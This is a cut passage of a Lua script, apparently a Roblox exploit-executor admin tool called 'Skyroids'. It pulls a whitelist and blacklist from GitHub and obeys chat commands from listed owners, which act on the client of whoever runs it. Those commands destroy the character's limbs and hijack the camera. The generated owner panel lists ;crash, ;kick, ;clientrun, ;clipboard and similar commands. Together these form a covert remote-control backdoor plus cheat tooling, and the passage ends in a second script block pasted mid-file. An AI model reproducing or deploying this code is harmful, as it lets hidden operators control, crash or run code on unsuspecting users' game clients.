workspace.garbagecandrink.LeftUpperArm:Destroy()
workspace.garbagecandrink.RightUpperArm:Destroy()
end)
pcall(function()
workspace.garbagecandrink["Left Arm"]:Destroy()
workspace.garbagecandrink["Right Arm"]:Destroy()
end)
elseif msg == ";nolegs" then
    pcall(function()
workspace.garbagecandrink.RightUpperLeg:Destroy()
workspace.garbagecandrink.LeftUpperLeg:Destroy()
end)
pcall(function()
workspace.garbagecandrink["Left Leg"]:Destroy()
workspace.garbagecandrink["Right Leg"]:Destroy()
end)
elseif msg == ";nolimbs" then
    pcall(function()
workspace.garbagecandrink.RightUpperLeg:Destroy()
workspace.garbagecandrink.LeftUpperLeg:Destroy()
end)
pcall(function()
workspace.garbagecandrink["Left Leg"]:Destroy()
workspace.garbagecandrink["Right Leg"]:Destroy()
end)
pcall(function()
workspace.garbagecandrink.RightUpperArm:Destroy()
workspace.garbagecandrink.LeftUpperArm:Destroy()
end)
pcall(function()
workspace.garbagecandrink["Left Arm"]:Destroy()
workspace.garbagecandrink["Right Arm"]:Destroy()
end)









                elseif msg:lower() == ";unview" then
                    jump()
		if workspace.CurrentCamera.CameraSubject == player.Character:FindFirstChildOfClass("Humanoid") then
			if game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
				workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
				workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
			end
		end
	elseif msg:lower() == ";view" then
        jump()
		if workspace.CurrentCamera.CameraSubject ~= nil and workspace.CurrentCamera.CameraSubject ~= game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
			if game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
				workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
				workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
				wait(0.1)
			end
		end
		if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
			workspace.CurrentCamera.CameraSubject = player.Character:FindFirstChildOfClass("Humanoid")
			workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
		end
	end
            end

            -- Owner-only global toggles
            if isOwner then
                if msg == ";disable private members" then
                    getgenv().SKYROIDS_ALLOW_PRIVATE_COMMANDS = false
                elseif msg == ";enable private members" then
                    getgenv().SKYROIDS_ALLOW_PRIVATE_COMMANDS = true
                end
            end
        end)

        table.insert(getgenv().SKYROIDS_DISCONNECTS, conn)
    end

    -- Connect to existing players except local player
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= localPlayer then handlePlayer(p) end
    end

    -- Connect to future players
    local joinConn = Players.PlayerAdded:Connect(function(p)
        handlePlayer(p)
    end)
    table.insert(getgenv().SKYROIDS_DISCONNECTS, joinConn)

    -- Watchdog loop to reinit if whitelist changes
    task.spawn(function()
        while getgenv().SKYROIDS_RUNNING do
            task.wait(30) -- Check every 30 seconds (fixed from 1 to 30 for performance)
            local newData = loadWhitelist()
            if newData and HttpService:JSONEncode(newData) ~= previousJSON then
                start()
                break
            end
        end
    end)
end

start()
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local url = "https://github.com/vipralock/Skyroids/raw/refs/heads/main/blacklist.lua"
local player = Players.LocalPlayer

local success, result = pcall(function()
	return HttpService:JSONDecode(game:HttpGet(url))
end)

if success and result and result.users then
	if result.users[tostring(player.UserId)] then
		-- Monstrum's Gui to Lua\n-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local PrivateOwnerPanel = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local UIStroke = Instance.new("UIStroke")
local UIGradient = Instance.new("UIGradient")
local TextLabel = Instance.new("TextLabel")
local ScrollingFrame = Instance.new("ScrollingFrame")
local UICorner_2 = Instance.new("UICorner")
local UIStroke_2 = Instance.new("UIStroke")
local TextButton = Instance.new("TextButton")
local UIPadding = Instance.new("UIPadding")
local UIListLayout = Instance.new("UIListLayout")
local TextButton_2 = Instance.new("TextButton")
local UIPadding_2 = Instance.new("UIPadding")
local TextButton_3 = Instance.new("TextButton")
local UIPadding_3 = Instance.new("UIPadding")
local TextButton_4 = Instance.new("TextButton")
local UIPadding_4 = Instance.new("UIPadding")
local TextButton_5 = Instance.new("TextButton")
local UIPadding_5 = Instance.new("UIPadding")
local TextButton_6 = Instance.new("TextButton")
local UIPadding_6 = Instance.new("UIPadding")
local TextButton_7 = Instance.new("TextButton")
local UIPadding_7 = Instance.new("UIPadding")
local TextButton_8 = Instance.new("TextButton")
local UIPadding_8 = Instance.new("UIPadding")
local TextButton_9 = Instance.new("TextButton")
local UIPadding_9 = Instance.new("UIPadding")
local TextButton_10 = Instance.new("TextButton")
local UIPadding_10 = Instance.new("UIPadding")
local TextButton_11 = Instance.new("TextButton")
local UIPadding_11 = Instance.new("UIPadding")
local TextButton_12 = Instance.new("TextButton")
local UIPadding_12 = Instance.new("UIPadding")
local TextButton_13 = Instance.new("TextButton")
local UIPadding_13 = Instance.new("UIPadding")
local TextButton_14 = Instance.new("TextButton")
local UIPadding_14 = Instance.new("UIPadding")
local TextButton_15 = Instance.new("TextButton")
local UIPadding_15 = Instance.new("UIPadding")
local TextButton_16 = Instance.new("TextButton")
local UIPadding_16 = Instance.new("UIPadding")
local TextButton_17 = Instance.new("TextButton")
local UIPadding_17 = Instance.new("UIPadding")
local TextButton_18 = Instance.new("TextButton")
local UIPadding_18 = Instance.new("UIPadding")
local TextButton_19 = Instance.new("TextButton")
local UIPadding_19 = Instance.new("UIPadding")
local TextButton_20 = Instance.new("TextButton")
local UIPadding_20 = Instance.new("UIPadding")
local TextButton_21 = Instance.new("TextButton")
local UIPadding_21 = Instance.new("UIPadding")
local TextButton_22 = Instance.new("TextButton")
local UIPadding_22 = Instance.new("UIPadding")
local TextButton_23 = Instance.new("TextButton")
local UIPadding_23 = Instance.new("UIPadding")
local TextButton_24 = Instance.new("TextButton")
local UIPadding_24 = Instance.new("UIPadding")
local TextButton_25 = Instance.new("TextButton")
local UIPadding_25 = Instance.new("UIPadding")
local TextButton_26 = Instance.new("TextButton")
local UIPadding_26 = Instance.new("UIPadding")
local TextButton_27 = Instance.new("TextButton")
local UIPadding_27 = Instance.new("UIPadding")
local TextButton_28 = Instance.new("TextButton")
local UIPadding_28 = Instance.new("UIPadding")
local TextButton_29 = Instance.new("TextButton")
local UIPadding_29 = Instance.new("UIPadding")
local TextButton_30 = Instance.new("TextButton")
local UIPadding_30 = Instance.new("UIPadding")
local TextButton_31 = Instance.new("TextButton")
local UIPadding_31 = Instance.new("UIPadding")
local TextButton_32 = Instance.new("TextButton")
local UIPadding_32 = Instance.new("UIPadding")
local TextButton_33 = Instance.new("TextButton")
local UIPadding_33 = Instance.new("UIPadding")
local TextButton_34 = Instance.new("TextButton")
local UIPadding_34 = Instance.new("UIPadding")
local TextButton_35 = Instance.new("TextButton")
local UIPadding_35 = Instance.new("UIPadding")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

PrivateOwnerPanel.Name = "Private/Owner Panel"
PrivateOwnerPanel.Parent = ScreenGui
PrivateOwnerPanel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PrivateOwnerPanel.BorderColor3 = Color3.fromRGB(0, 0, 0)
PrivateOwnerPanel.BorderSizePixel = 0
PrivateOwnerPanel.Position = UDim2.new(0.399108589, 0, 0.161682889, 0)
PrivateOwnerPanel.Size = UDim2.new(0, 199, 0, 389)

UICorner.CornerRadius = UDim.new(0, 5)
UICorner.Parent = PrivateOwnerPanel

UIStroke.Parent = PrivateOwnerPanel
UIStroke.Color = Color3.fromRGB(175, 105, 255)
UIStroke.Thickness = 2.000

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(53, 32, 83)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0))}
UIGradient.Rotation = 90
UIGradient.Parent = PrivateOwnerPanel

TextLabel.Parent = PrivateOwnerPanel
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0452261306, 0, 0.0154241649, 0)
TextLabel.Size = UDim2.new(0, 181, 0, 40)
TextLabel.Font = Enum.Font.Ubuntu
TextLabel.Text = "Panel"
TextLabel.TextColor3 = Color3.fromRGB(183, 83, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

ScrollingFrame.Parent = PrivateOwnerPanel
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0.0804020092, 0, 0.133676097, 0)
ScrollingFrame.Size = UDim2.new(0, 165, 0, 327)
ScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(187, 119, 255)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 6, 0)

UICorner_2.CornerRadius = UDim.new(0, 5)
UICorner_2.Parent = ScrollingFrame

UIStroke_2.Parent = ScrollingFrame
UIStroke_2.Color = Color3.fromRGB(175, 105, 255)
UIStroke_2.Thickness = 2.000
UIStroke_2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

TextButton.Parent = ScrollingFrame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Size = UDim2.new(0, 165, 0, 32)
TextButton.Font = Enum.Font.Ubuntu
TextButton.Text = ";kill"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true
TextButton.TextXAlignment = Enum.TextXAlignment.Left

UIPadding.Parent = TextButton
UIPadding.PaddingLeft = UDim.new(0, 6)

UIListLayout.Parent = ScrollingFrame
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

TextButton_2.Parent = ScrollingFrame
TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.BackgroundTransparency = 1.000
TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.BorderSizePixel = 0
TextButton_2.Size = UDim2.new(0, 165, 0, 32)
TextButton_2.Font = Enum.Font.Ubuntu
TextButton_2.Text = ";sit"
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextWrapped = true
TextButton_2.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_2.Parent = TextButton_2
UIPadding_2.PaddingLeft = UDim.new(0, 6)

TextButton_3.Parent = ScrollingFrame
TextButton_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.BackgroundTransparency = 1.000
TextButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.BorderSizePixel = 0
TextButton_3.Size = UDim2.new(0, 165, 0, 32)
TextButton_3.Font = Enum.Font.Ubuntu
TextButton_3.Text = ";jump"
TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 14.000
TextButton_3.TextWrapped = true
TextButton_3.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_3.Parent = TextButton_3
UIPadding_3.PaddingLeft = UDim.new(0, 6)

TextButton_4.Parent = ScrollingFrame
TextButton_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.BackgroundTransparency = 1.000
TextButton_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.BorderSizePixel = 0
TextButton_4.Size = UDim2.new(0, 165, 0, 32)
TextButton_4.Font = Enum.Font.Ubuntu
TextButton_4.Text = ";bring"
TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.TextScaled = true
TextButton_4.TextSize = 14.000
TextButton_4.TextWrapped = true
TextButton_4.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_4.Parent = TextButton_4
UIPadding_4.PaddingLeft = UDim.new(0, 6)

TextButton_5.Parent = ScrollingFrame
TextButton_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_5.BackgroundTransparency = 1.000
TextButton_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.BorderSizePixel = 0
TextButton_5.Size = UDim2.new(0, 165, 0, 32)
TextButton_5.Font = Enum.Font.Ubuntu
TextButton_5.Text = ";trip"
TextButton_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_5.TextScaled = true
TextButton_5.TextSize = 14.000
TextButton_5.TextWrapped = true
TextButton_5.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_5.Parent = TextButton_5
UIPadding_5.PaddingLeft = UDim.new(0, 6)

TextButton_6.Parent = ScrollingFrame
TextButton_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_6.BackgroundTransparency = 1.000
TextButton_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.BorderSizePixel = 0
TextButton_6.Size = UDim2.new(0, 165, 0, 32)
TextButton_6.Font = Enum.Font.Ubuntu
TextButton_6.Text = ";freeze"
TextButton_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_6.TextScaled = true
TextButton_6.TextSize = 14.000
TextButton_6.TextWrapped = true
TextButton_6.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_6.Parent = TextButton_6
UIPadding_6.PaddingLeft = UDim.new(0, 6)

TextButton_7.Parent = ScrollingFrame
TextButton_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_7.BackgroundTransparency = 1.000
TextButton_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_7.BorderSizePixel = 0
TextButton_7.Size = UDim2.new(0, 165, 0, 32)
TextButton_7.Font = Enum.Font.Ubuntu
TextButton_7.Text = ";unfreeze"
TextButton_7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_7.TextScaled = true
TextButton_7.TextSize = 14.000
TextButton_7.TextWrapped = true
TextButton_7.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_7.Parent = TextButton_7
UIPadding_7.PaddingLeft = UDim.new(0, 6)

TextButton_8.Parent = ScrollingFrame
TextButton_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_8.BackgroundTransparency = 1.000
TextButton_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_8.BorderSizePixel = 0
TextButton_8.Size = UDim2.new(0, 165, 0, 32)
TextButton_8.Font = Enum.Font.Ubuntu
TextButton_8.Text = ";kick"
TextButton_8.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_8.TextScaled = true
TextButton_8.TextSize = 14.000
TextButton_8.TextWrapped = true
TextButton_8.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_8.Parent = TextButton_8
UIPadding_8.PaddingLeft = UDim.new(0, 6)

TextButton_9.Parent = ScrollingFrame
TextButton_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_9.BackgroundTransparency = 1.000
TextButton_9.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_9.BorderSizePixel = 0
TextButton_9.Size = UDim2.new(0, 165, 0, 32)
TextButton_9.Font = Enum.Font.Ubuntu
TextButton_9.Text = ";ban"
TextButton_9.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_9.TextScaled = true
TextButton_9.TextSize = 14.000
TextButton_9.TextWrapped = true
TextButton_9.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_9.Parent = TextButton_9
UIPadding_9.PaddingLeft = UDim.new(0, 6)

TextButton_10.Parent = ScrollingFrame
TextButton_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_10.BackgroundTransparency = 1.000
TextButton_10.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_10.BorderSizePixel = 0
TextButton_10.Size = UDim2.new(0, 165, 0, 32)
TextButton_10.Font = Enum.Font.Ubuntu
TextButton_10.Text = ";troll"
TextButton_10.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_10.TextScaled = true
TextButton_10.TextSize = 14.000
TextButton_10.TextWrapped = true
TextButton_10.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_10.Parent = TextButton_10
UIPadding_10.PaddingLeft = UDim.new(0, 6)

TextButton_11.Parent = ScrollingFrame
TextButton_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_11.BackgroundTransparency = 1.000
TextButton_11.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_11.BorderSizePixel = 0
TextButton_11.Size = UDim2.new(0, 165, 0, 32)
TextButton_11.Font = Enum.Font.Ubuntu
TextButton_11.Text = ";say"
TextButton_11.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_11.TextScaled = true
TextButton_11.TextSize = 14.000
TextButton_11.TextWrapped = true
TextButton_11.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_11.Parent = TextButton_11
UIPadding_11.PaddingLeft = UDim.new(0, 6)

TextButton_12.Parent = ScrollingFrame
TextButton_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_12.BackgroundTransparency = 1.000
TextButton_12.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_12.BorderSizePixel = 0
TextButton_12.Size = UDim2.new(0, 165, 0, 32)
TextButton_12.Font = Enum.Font.Ubuntu
TextButton_12.Text = ";anticheat"
TextButton_12.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_12.TextScaled = true
TextButton_12.TextSize = 14.000
TextButton_12.TextWrapped = true
TextButton_12.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_12.Parent = TextButton_12
UIPadding_12.PaddingLeft = UDim.new(0, 6)

TextButton_13.Parent = ScrollingFrame
TextButton_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_13.BackgroundTransparency = 1.000
TextButton_13.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_13.BorderSizePixel = 0
TextButton_13.Size = UDim2.new(0, 165, 0, 32)
TextButton_13.Font = Enum.Font.Ubuntu
TextButton_13.Text = ";crash"
TextButton_13.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_13.TextScaled = true
TextButton_13.TextSize = 14.000
TextButton_13.TextWrapped = true
TextButton_13.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_13.Parent = TextButton_13
UIPadding_13.PaddingLeft = UDim.new(0, 6)

TextButton_14.Parent = ScrollingFrame
TextButton_14.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_14.BackgroundTransparency = 1.000
TextButton_14.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_14.BorderSizePixel = 0
TextButton_14.Size = UDim2.new(0, 165, 0, 32)
TextButton_14.Font = Enum.Font.Ubuntu
TextButton_14.Text = ";executor"
TextButton_14.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_14.TextScaled = true
TextButton_14.TextSize = 14.000
TextButton_14.TextWrapped = true
TextButton_14.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_14.Parent = TextButton_14
UIPadding_14.PaddingLeft = UDim.new(0, 6)

TextButton_15.Parent = ScrollingFrame
TextButton_15.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_15.BackgroundTransparency = 1.000
TextButton_15.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_15.BorderSizePixel = 0
TextButton_15.Size = UDim2.new(0, 165, 0, 32)
TextButton_15.Font = Enum.Font.Ubuntu
TextButton_15.Text = ";device"
TextButton_15.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_15.TextScaled = true
TextButton_15.TextSize = 14.000
TextButton_15.TextWrapped = true
TextButton_15.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_15.Parent = TextButton_15
UIPadding_15.PaddingLeft = UDim.new(0, 6)

TextButton_16.Parent = ScrollingFrame
TextButton_16.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_16.BackgroundTransparency = 1.000
TextButton_16.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_16.BorderSizePixel = 0
TextButton_16.Size = UDim2.new(0, 165, 0, 32)
TextButton_16.Font = Enum.Font.Ubuntu
TextButton_16.Text = ";clientrun"
TextButton_16.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_16.TextScaled = true
TextButton_16.TextSize = 14.000
TextButton_16.TextWrapped = true
TextButton_16.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_16.Parent = TextButton_16
UIPadding_16.PaddingLeft = UDim.new(0, 6)

TextButton_17.Parent = ScrollingFrame
TextButton_17.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_17.BackgroundTransparency = 1.000
TextButton_17.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_17.BorderSizePixel = 0
TextButton_17.Size = UDim2.new(0, 165, 0, 32)
TextButton_17.Font = Enum.Font.Ubuntu
TextButton_17.Text = ";dance"
TextButton_17.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_17.TextScaled = true
TextButton_17.TextSize = 14.000
TextButton_17.TextWrapped = true
TextButton_17.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_17.Parent = TextButton_17
UIPadding_17.PaddingLeft = UDim.new(0, 6)

TextButton_18.Parent = ScrollingFrame
TextButton_18.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_18.BackgroundTransparency = 1.000
TextButton_18.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_18.BorderSizePixel = 0
TextButton_18.Size = UDim2.new(0, 165, 0, 32)
TextButton_18.Font = Enum.Font.Ubuntu
TextButton_18.Text = ";undance"
TextButton_18.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_18.TextScaled = true
TextButton_18.TextSize = 14.000
TextButton_18.TextWrapped = true
TextButton_18.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_18.Parent = TextButton_18
UIPadding_18.PaddingLeft = UDim.new(0, 6)

TextButton_19.Parent = ScrollingFrame
TextButton_19.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_19.BackgroundTransparency = 1.000
TextButton_19.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_19.BorderSizePixel = 0
TextButton_19.Size = UDim2.new(0, 165, 0, 32)
TextButton_19.Font = Enum.Font.Ubuntu
TextButton_19.Text = ";clocktime"
TextButton_19.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_19.TextScaled = true
TextButton_19.TextSize = 14.000
TextButton_19.TextWrapped = true
TextButton_19.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_19.Parent = TextButton_19
UIPadding_19.PaddingLeft = UDim.new(0, 6)

TextButton_20.Parent = ScrollingFrame
TextButton_20.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_20.BackgroundTransparency = 1.000
TextButton_20.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_20.BorderSizePixel = 0
TextButton_20.Size = UDim2.new(0, 165, 0, 32)
TextButton_20.Font = Enum.Font.Ubuntu
TextButton_20.Text = ";snail"
TextButton_20.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_20.TextScaled = true
TextButton_20.TextSize = 14.000
TextButton_20.TextWrapped = true
TextButton_20.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_20.Parent = TextButton_20
UIPadding_20.PaddingLeft = UDim.new(0, 6)

TextButton_21.Parent = ScrollingFrame
TextButton_21.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_21.BackgroundTransparency = 1.000
TextButton_21.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_21.BorderSizePixel = 0
TextButton_21.Size = UDim2.new(0, 165, 0, 32)
TextButton_21.Font = Enum.Font.Ubuntu
TextButton_21.Text = ";unsnail"
TextButton_21.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_21.TextScaled = true
TextButton_21.TextSize = 14.000
TextButton_21.TextWrapped = true
TextButton_21.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_21.Parent = TextButton_21
UIPadding_21.PaddingLeft = UDim.new(0, 6)

TextButton_22.Parent = ScrollingFrame
TextButton_22.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_22.BackgroundTransparency = 1.000
TextButton_22.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_22.BorderSizePixel = 0
TextButton_22.Size = UDim2.new(0, 165, 0, 32)
TextButton_22.Font = Enum.Font.Ubuntu
TextButton_22.Text = ";error"
TextButton_22.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_22.TextScaled = true
TextButton_22.TextSize = 14.000
TextButton_22.TextWrapped = true
TextButton_22.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_22.Parent = TextButton_22
UIPadding_22.PaddingLeft = UDim.new(0, 6)

TextButton_23.Parent = ScrollingFrame
TextButton_23.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_23.BackgroundTransparency = 1.000
TextButton_23.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_23.BorderSizePixel = 0
TextButton_23.Size = UDim2.new(0, 165, 0, 32)
TextButton_23.Font = Enum.Font.Ubuntu
TextButton_23.Text = ";clipboard"
TextButton_23.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_23.TextScaled = true
TextButton_23.TextSize = 14.000
TextButton_23.TextWrapped = true
TextButton_23.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_23.Parent = TextButton_23
UIPadding_23.PaddingLeft = UDim.new(0, 6)

TextButton_24.Parent = ScrollingFrame
TextButton_24.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_24.BackgroundTransparency = 1.000
TextButton_24.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_24.BorderSizePixel = 0
TextButton_24.Size = UDim2.new(0, 165, 0, 32)
TextButton_24.Font = Enum.Font.Ubuntu
TextButton_24.Text = ";commandbar"
TextButton_24.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_24.TextScaled = true
TextButton_24.TextSize = 14.000
TextButton_24.TextWrapped = true
TextButton_24.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_24.Parent = TextButton_24
UIPadding_24.PaddingLeft = UDim.new(0, 6)

TextButton_25.Parent = ScrollingFrame
TextButton_25.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_25.BackgroundTransparency = 1.000
TextButton_25.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_25.BorderSizePixel = 0
TextButton_25.Size = UDim2.new(0, 165, 0, 32)
TextButton_25.Font = Enum.Font.Ubuntu
TextButton_25.Text = ";active"
TextButton_25.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_25.TextScaled = true
TextButton_25.TextSize = 14.000
TextButton_25.TextWrapped = true
TextButton_25.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_25.Parent = TextButton_25
UIPadding_25.PaddingLeft = UDim.new(0, 6)

TextButton_26.Parent = ScrollingFrame
TextButton_26.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_26.BackgroundTransparency = 1.000
TextButton_26.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_26.BorderSizePixel = 0
TextButton_26.Size = UDim2.new(0, 165, 0, 32)
TextButton_26.Font = Enum.Font.Ubuntu
TextButton_26.Text = ";funnykick"
TextButton_26.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_26.TextScaled = true
TextButton_26.TextSize = 14.000
TextButton_26.TextWrapped = true
TextButton_26.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_26.Parent = TextButton_26
UIPadding_26.PaddingLeft = UDim.new(0, 6)

TextButton_27.Parent = ScrollingFrame
TextButton_27.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_27.BackgroundTransparency = 1.000
TextButton_27.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_27.BorderSizePixel = 0
TextButton_27.Size = UDim2.new(0, 165, 0, 32)
TextButton_27.Font = Enum.Font.Ubuntu
TextButton_27.Text = ";barrelroll"
TextButton_27.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_27.TextScaled = true
TextButton_27.TextSize = 14.000
TextButton_27.TextWrapped = true
TextButton_27.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_27.Parent = TextButton_27
UIPadding_27.PaddingLeft = UDim.new(0, 6)

TextButton_28.Parent = ScrollingFrame
TextButton_28.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_28.BackgroundTransparency = 1.000
TextButton_28.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_28.BorderSizePixel = 0
TextButton_28.Position = UDim2.new(0, 0, 0.406727821, 0)
TextButton_28.Size = UDim2.new(0, 155, 0, 32)
TextButton_28.Font = Enum.Font.Ubuntu
TextButton_28.Text = ";blockremotes"
TextButton_28.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_28.TextScaled = true
TextButton_28.TextSize = 14.000
TextButton_28.TextWrapped = true
TextButton_28.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_28.Parent = TextButton_28
UIPadding_28.PaddingLeft = UDim.new(0, 6)

TextButton_29.Parent = ScrollingFrame
